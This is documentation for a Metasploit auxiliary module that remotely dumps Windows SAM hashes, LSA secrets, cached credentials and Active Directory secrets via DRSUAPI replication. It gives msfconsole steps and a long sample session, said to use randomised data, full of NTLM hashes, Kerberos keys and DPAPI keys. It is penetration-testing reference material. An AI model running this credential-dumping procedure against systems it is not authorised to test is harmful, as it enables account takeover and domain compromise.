## Vulnerable Application
### Description
The `windows_secrets_dump` auxiliary module dumps SAM hashes and LSA secrets
(including cached creds) from the remote Windows target without executing any
agent locally. This is done by remotely updating the registry key security
descriptor, taking advantage of the WriteDACL privileges held by local
administrators to set temporary read permissions.

This can be disabled by setting the `INLINE` option to false and the module
will fallback to the original implementation, which consists in saving the
registry hives locally on the target (%SYSTEMROOT%\Temp\<random>.tmp),
downloading the temporary hive files and reading the data from it. This
temporary files are removed when it's done.

On domain controllers, secrets from Active Directory is extracted using [MS-DRDS]
DRSGetNCChanges(), replicating the attributes we need to get SIDs, NTLM hashes,
groups, password history, Kerberos keys and other interesting data. Note that
the actual `NTDS.dit` file is not downloaded. Instead, the Directory
Replication Service directly asks Active Directory through RPC requests.

This modules takes care of starting or enabling the Remote Registry service if
needed. It will restore the service to its original state when it's done.

This is a port of the great Impacket `secretsdump.py` code written by Alberto
Solino.

### Setup
A privileged user is required to run this module, typically a local or domain
Administrator. It has been tested against multiple Windows versions, from
Windows XP/Server 2003 to Windows 10/Server version 2022.

## Verification Steps
1. Start msfconsole
2. Do: `use auxiliary/gather/windows_secrets_dump`
3. Do: `set RHOSTS <target>` (Windows host)
4. Do: `set SMBUser <username>` (privileged user)
5. Do: `set SMBDomain <domain name>` (only for domain users)
6. Do: `set SMBPass <password>`
7. Do: `run`
8. You should get the dump result displayed
9. Do: `hosts`
10. Verify the host information is there
11. Do: `services`
12. Verify the service information is there
13. Do: `creds`
14. Verify the dumped credentials are there
13. Do: `notes`
14. Verify the notes are there

## Options

### INLINE
Use inline technique to read protected keys from the registry remotely without
saving the hives to disk (default: true).

### KRB_USERS
Restrict retrieving domain information to the users or groups specified. This
is a comma-separated list of Active Directory groups and users. This parameter
is only utilised for domain replication (`action` set to `DOMAIN` or `ALL`).
`set KRB_USERS "user1,user2,Domain Admins"

### KRB_TYPES
Restrict retrieving domain information to a specific type of account; either
`USERS_ONLY` or `COMPUTERS_ONLY`, or `ALL` to retrieve all accounts. This
parameter is only utilised for domain replication (`action` set to `DOMAIN` or
`ALL`). It is ignored if `KRB_USERS` is also set.

## Actions

### ALL
This dumps everything (SAM hashes, Cache data, LSA secrets and DOMAIN info).
This is the default action.

### SAM
This only dumps the SAM hashes.

### CACHE
This only dumps the Cached data.

### LSA
This only dumps the LSA secrets.

### DOMAIN
This only dumps the NTDS.dit secrets from Active Directory (credentials,
password history, Kerberos keys, etc.).

## Scenarios
The data shown below has been altered with random data to avoid exposing
sensitive information.

### Windows Server 2012 (Domain Controller)
```
msf6 auxiliary(gather/windows_secrets_dump) > options

Module options (auxiliary/gather/windows_secrets_dump):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     192.168.100.123  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              yes       The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    123456           no        The password for the specified username
   SMBUser    msfuser         no        The username to authenticate as


Auxiliary action:

   Name  Description
   ----  -----------
   ALL   Dump everything


msf6 auxiliary(gather/windows_secrets_dump) > run
[*] Running module against 192.168.100.123

[*] 192.168.100.123:445 - Service RemoteRegistry is in stopped state
[*] 192.168.100.123:445 - Starting service...
[*] 192.168.100.123:445 - Retrieving target system bootKey
[+] 192.168.100.123:445 - bootKey: 0x8f52b915365487d0b2005d3e6ae6eb2b
[*] 192.168.100.123:445 - Saving remote SAM database
[*] 192.168.100.123:445 - Dumping SAM hashes
[*] 192.168.100.123:445 - Password hints:
No users with password hints on this system
[*] 192.168.100.123:445 - Password hashes (pwdump format - uid:rid:lmhash:nthash:::):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:958be10a71d239e318078816aa929d08:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:84c140afd4e203cc90a977580e78f768:::
[*] 192.168.100.123:445 - Saving remote SECURITY database
[*] 192.168.100.123:445 - Decrypting LSA Key
[*] 192.168.100.123:445 - Dumping LSA Secrets
$MACHINE.ACC
MYLAB\WIN-340ED5H7S8$:plain_password_hex:b4ac4211cc8ec3f63cf005590bb06aad9c7bd5576ae57b21843d8973b5c208e0ad39b1c7f574d50be9c36fcd379315fccfae3d334364f19df40929b75d7592bf5df715318e2796e68fa59259017ee80b06bc1ac140fb14402c032273101488ab8a0868e90b9ec4e94b73e2b51a6bf9de518474e0cef7f1c7f8f38a575a2bb253dd97ffc0373b6c591cc66acf78ac77da42282291f77b8f4aef0ef9c5e293351caee2dec7c282106603b9d6e2618110394abc1182ae66b3777b738742c087e671e659e547bc45d7fc887407cf89517a4d51bff56f9a31c270037df1a7b80eba0926825a58ae0ee9878ab355cd4062d0b9
MYLAB\WIN-340ED5H7S8$:aes256-cts-hmac-sha1-96:90f28a5df2b417c96ca2fa18676f3735c4a697b94005378664169f96778400bb
MYLAB\WIN-340ED5H7S8$:aes128-cts-hmac-sha1-96:5895d4b7a9400f1d6565c1989320a1c6
MYLAB\WIN-340ED5H7S8$:des-cbc-md5:638a17d7c3480c12
MYLAB\WIN-340ED5H7S8$:aad3b435b51404eeaad3b435b51404ee:2abda1b5b936ed310fa624d6afbc4c52:::

DefaultPassword
(Unknown User): FOO$000

DPAPI_SYSTEM
dpapi_machinekey: 0xec969866a5bf6bd74f50c790536e58f8cd45da24
dpapi_userkey: 0xc67ad895123894e9d5d5efd0cf84c00b618cc48e

NL$KM
75 31 51 ae 2c 00 3c aa ff 73 db 34 46 c2 93 06    |u1Q.,.<..s.4F...|
81 85 02 41 02 ad 1b bd 2f 18 e3 4c b4 a7 c4 8a    |...A..../..L....|
3c 0f d4 29 74 91 a3 08 60 e4 41 1b 84 e8 0e 68    |<..)t...`.A....h|
67 7a 69 31 b0 e5 1e f9 e1 a6 f5 53 95 12 c3 47    |gzi1.......S...G|
Hex string: 2a2b513771a2bebc7395ee9648dd7a5e771d52bac713c6edd28f32b3f9259516ca19f562d7f633f55a02dd7f6d4471b7f66ae539327c64fd3c49cdbb267417e1

[*] 192.168.100.123:445 - Decrypting NL$KM
[*] 192.168.100.123:445 - Dumping cached hashes
No cached hashes on this system
[*] 192.168.100.123:445 - Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] 192.168.100.123:445 - Using the DRSUAPI method to get NTDS.DIT secrets
# SID's:
MYLAB\Administrator: S-1-5-21-413541012-3457123-5043211362-500
MYLAB\Guest: S-1-5-21-413541012-3457123-5043211362-501
MYLAB\krbtgt: S-1-5-21-413541012-3457123-5043211362-502
MYLAB\msfuser: S-1-5-21-413541012-3457123-5043211362-1105
MYLAB\test: S-1-5-21-413541012-3457123-5043211362-1110
MYLAB\WIN-340ED5H7S8$: S-1-5-21-413541012-3457123-5043211362-1001
MYLAB\DESKTOP-EQR2M7J$: S-1-5-21-413541012-3457123-5043211362-1104
MYLAB\WIN-K1F52W6Q3T1$: S-1-5-21-413541012-3457123-5043211362-1107
MYLAB\WIN-51S22F6Q7TW$: S-1-5-21-413541012-3457123-5043211362-1109
MYLAB\WIN2003X86$: S-1-5-21-413541012-3457123-5043211362-1602

# NTLM hashes:
MYLAB\Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:::
MYLAB\Guest:501:aad3b435b51404eeaad3b435b51404ee:0b133f7d7a06732dbb9be367f1123542:::
MYLAB\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06b220fae92049837807f2398d2c4d7e:::
MYLAB\msfuser:1105:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:::
MYLAB\test:1110:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:::
MYLAB\WIN-340ED5H7S8$:1001:aad3b435b51404eeaad3b435b51404ee:9d58c33fe9fe500125a9b72b51c4b5b5:::
MYLAB\DESKTOP-EQR2M7J$:1104:aad3b435b51404eeaad3b435b51404ee:2d634718372014e58f1cb37e51954e78:::
MYLAB\WIN-K1F52W6Q3T1$:1107:aad3b435b51404eeaad3b435b51404ee:14ca1e6a9f228e586c416a3d4c787892:::
MYLAB\WIN-51S22F6Q7TW$:1109:aad3b435b51404eeaad3b435b51404ee:81d8d1901fc651b09a9654f695e4ff7c:::
MYLAB\WIN2003X86$:1602:aad3b435b51404eeaad3b435b51404ee:6ded122fc7e0505a3b3f8286d9131c4c:::

# Full pwdump format:
MYLAB\Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202108100936,LastLogonTimestamp=202109271034,IsAdministrator=true,IsDomainAdmin=true,IsEnterpriseAdmin=true::
MYLAB\Guest:501:aad3b435b51404eeaad3b435b51404ee:0b133f7d7a06732dbb9be367f1123542:Disabled=true,Expired=false,PasswordNeverExpires=true,PasswordNotRequired=true,PasswordLastChanged=never,LastLogonTimestamp=never,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
MYLAB\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06b220fae92049837807f2398d2c4d7e:Disabled=true,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202106091817,LastLogonTimestamp=never,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
MYLAB\msfuser:1105:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202106100950,LastLogonTimestamp=202109271329,IsAdministrator=true,IsDomainAdmin=false,IsEnterpriseAdmin=false::
MYLAB\test:1110:aad3b435b51404eeaad3b435b51404ee:6a2e4f12c8962251d42e8413d9a145bd:Disabled=false,Expired=true,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202108121626,LastLogonTimestamp=never,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
MYLAB\WIN-340ED5H7S8$:1001:aad3b435b51404eeaad3b435b51404ee:9d58c33fe9fe500125a9b72b51c4b5b5:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202109241046,LastLogonTimestamp=202109241046,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
MYLAB\DESKTOP-EQR2M7J$:1104:aad3b435b51404eeaad3b435b51404ee:2d634718372014e58f1cb37e51954e78:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202108101043,LastLogonTimestamp=202108101043,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
MYLAB\WIN-K1F52W6Q3T1$:1107:aad3b435b51404eeaad3b435b51404ee:14ca1e6a9f228e586c416a3d4c787892:Disabled=true,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202108091014,LastLogonTimestamp=202108091014,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
MYLAB\WIN-51S22F6Q7TW$:1109:aad3b435b51404eeaad3b435b51404ee:81d8d1901fc651b09a9654f695e4ff7c:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202109281101,LastLogonTimestamp=202109281101,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::
MYLAB\WIN2003X86$:1602:aad3b435b51404eeaad3b435b51404ee:6ded122fc7e0505a3b3f8286d9131c4c:Disabled=false,Expired=false,PasswordNeverExpires=false,PasswordNotRequired=false,PasswordLastChanged=202109291610,LastLogonTimestamp=202109291610,IsAdministrator=false,IsDomainAdmin=false,IsEnterpriseAdmin=false::

# Account Info:
## CN=Administrator,CN=Users,DC=mylab,DC=local
- Administrator: true
- Domain Admin: true
- Enterprise Admin: true
- Password last changed: 2021-08-10 09:36:31 UTC
- Last logon: 2021-09-27 10:34:20 UTC
- Account disabled: false
- Computer account: false
- Expired: false
- Password never expires: false
- Password not required: false
## CN=Guest,CN=Users,DC=mylab,DC=local
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: never
- Last logon: never
- Account disabled: true
- Computer account: false
- Expired: false
- Password never expires: true
- Password not required: true
## CN=krbtgt,CN=Users,DC=mylab,DC=local
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2021-06-09 18:17:48 UTC
- Last logon: never
- Account disabled: true
- Computer account: false
- Expired: false
- Password never expires: false
- Password not required: false
## CN=msfuser,CN=Users,DC=mylab,DC=local
- Administrator: true
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2021-06-10 09:50:47 UTC
- Last logon: 2021-09-27 13:29:04 UTC
- Account disabled: false
- Computer account: false
- Expired: false
- Password never expires: false
- Password not required: false
## CN=Test Foo,CN=Users,DC=mylab,DC=local
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2021-08-12 16:26:34 UTC
- Last logon: never
- Account disabled: false
- Computer account: false
- Expired: true
- Password never expires: false
- Password not required: false
## CN=WIN-340ED5H7S8,OU=Domain Controllers,DC=mylab,DC=local
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2021-09-24 10:46:19 UTC
- Last logon: 2021-09-24 10:46:19 UTC
- Account disabled: false
- Computer account: true
- Expired: false
- Password never expires: false
- Password not required: false
## CN=DESKTOP-EQR2M7J,CN=Computers,DC=mylab,DC=local
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2021-08-10 10:43:17 UTC
- Last logon: 2021-08-10 10:43:17 UTC
- Account disabled: false
- Computer account: true
- Expired: false
- Password never expires: false
- Password not required: false
## CN=WIN-K1F52W6Q3T1,CN=Computers,DC=mylab,DC=local
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2021-08-09 10:14:39 UTC
- Last logon: 2021-08-09 10:14:39 UTC
- Account disabled: true
- Computer account: true
- Expired: false
- Password never expires: false
- Password not required: false
## CN=WIN-51S22F6Q7TW,CN=Computers,DC=mylab,DC=local
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2021-09-28 11:01:18 UTC
- Last logon: 2021-09-28 11:01:18 UTC
- Account disabled: false
- Computer account: true
- Expired: false
- Password never expires: false
- Password not required: false
## CN=WIN2003X86,CN=Computers,DC=mylab,DC=local
- Administrator: false
- Domain Admin: false
- Enterprise Admin: false
- Password last changed: 2021-09-29 16:10:48 UTC
- Last logon: 2021-09-29 16:10:56 UTC
- Account disabled: false
- Computer account: true
- Expired: false
- Password never expires: false
- Password not required: false

# Password history:

# Kerberos keys:
MYLAB\Administrator:aes256-cts-hmac-sha1-96:058c9987a38ad78866470144eccc90693206bef1b29ef0ef2175f89af61cb2a0
MYLAB\Administrator:aes128-cts-hmac-sha1-96:c6ad3b805f833825986d0ac34e0f0858
MYLAB\Administrator:des-cbc-md5:9b86a5602257f19c
MYLAB\krbtgt:aes256-cts-hmac-sha1-96:a4d8fa9750a53569f003b250ecb55a3e4754e9e1e39c82fc373dfa7755e51860
MYLAB\krbtgt:aes128-cts-hmac-sha1-96:cde0828d4c759db5195d5b446df27d5a
MYLAB\krbtgt:des-cbc-md5:e1a9fdabc87fc7fc
MYLAB\msfuser:aes256-cts-hmac-sha1-96:580b30f097e5f2267502fbfb7038b7d34ed409bf5f043046a6d75372f4748c33
MYLAB\msfuser:aes128-cts-hmac-sha1-96:ca2c4e745e288a59ba17c2070500f1d0
MYLAB\msfuser:des-cbc-md5:ba53b946595b3176
MYLAB\test:aes256-cts-hmac-sha1-96:373f317dcfe7f2293ec881fc1665ca61641122f113e61e228c4484fb7db258df
MYLAB\test:aes128-cts-hmac-sha1-96:f6e104637495f01efaab2b1a2837918e
MYLAB\test:des-cbc-md5:2a27b26587ecf324
MYLAB\WIN-340ED5H7S8$:aes256-cts-hmac-sha1-96:bff8719d09c6f61f8576298c3a5ce00449fa86fc465896b8e0c65b13be04df27
MYLAB\WIN-340ED5H7S8$:aes128-cts-hmac-sha1-96:df3013df51167b8c988979bcbbb9aad4
MYLAB\WIN-340ED5H7S8$:des-cbc-md5:8da9946eedeb4c82
MYLAB\DESKTOP-EQR2M7J$:aes256-cts-hmac-sha1-96:b6b0e92ae339cb75babed5d1208cf931f499e69e87cf2147a4712416ffc6f554
MYLAB\DESKTOP-EQR2M7J$:aes128-cts-hmac-sha1-96:8481edf93ce4ca794d1de03bb00e4940
MYLAB\DESKTOP-EQR2M7J$:des-cbc-md5:1ca4baae341a6c8f
MYLAB\WIN-K1F52W6Q3T1$:aes256-cts-hmac-sha1-96:b57511524ba578a836dc11751070d310d959dd29c6a5a9d46018f26e0d9cf6a8
MYLAB\WIN-K1F52W6Q3T1$:aes128-cts-hmac-sha1-96:2ff7e707a2bcbaaba22ee4e633d1cce5
MYLAB\WIN-K1F52W6Q3T1$:des-cbc-md5:93f42858f59c07f2
MYLAB\WIN-51S22F6Q7TW$:aes256-cts-hmac-sha1-96:01a3e2f3a502324146bd2617961dc5e07e1406eadc3aa5cf97e44843f6773e88
MYLAB\WIN-51S22F6Q7TW$:aes128-cts-hmac-sha1-96:f03d11faf242766cd08dd7aea5c7bbcc
MYLAB\WIN-51S22F6Q7TW$:des-cbc-md5:37ee33c8fd401430
MYLAB\WIN2003X86$:aes256-cts-hmac-sha1-96:a678f096c08c570385a107bdc45184e47366a3ccbdb5333644c548f58d4d6b3c
MYLAB\WIN2003X86$:aes128-cts-hmac-sha1-96:ff2d54f76093a7641b6825df28203543
MYLAB\WIN2003X86$:des-cbc-md5:7cfa87f92422ea78

# Clear text passwords:
[*] 192.168.100.123:445 - Cleaning up...
[*] 192.168.100.123:445 - Stopping service RemoteRegistry...
[*] Auxiliary module execution completed
```
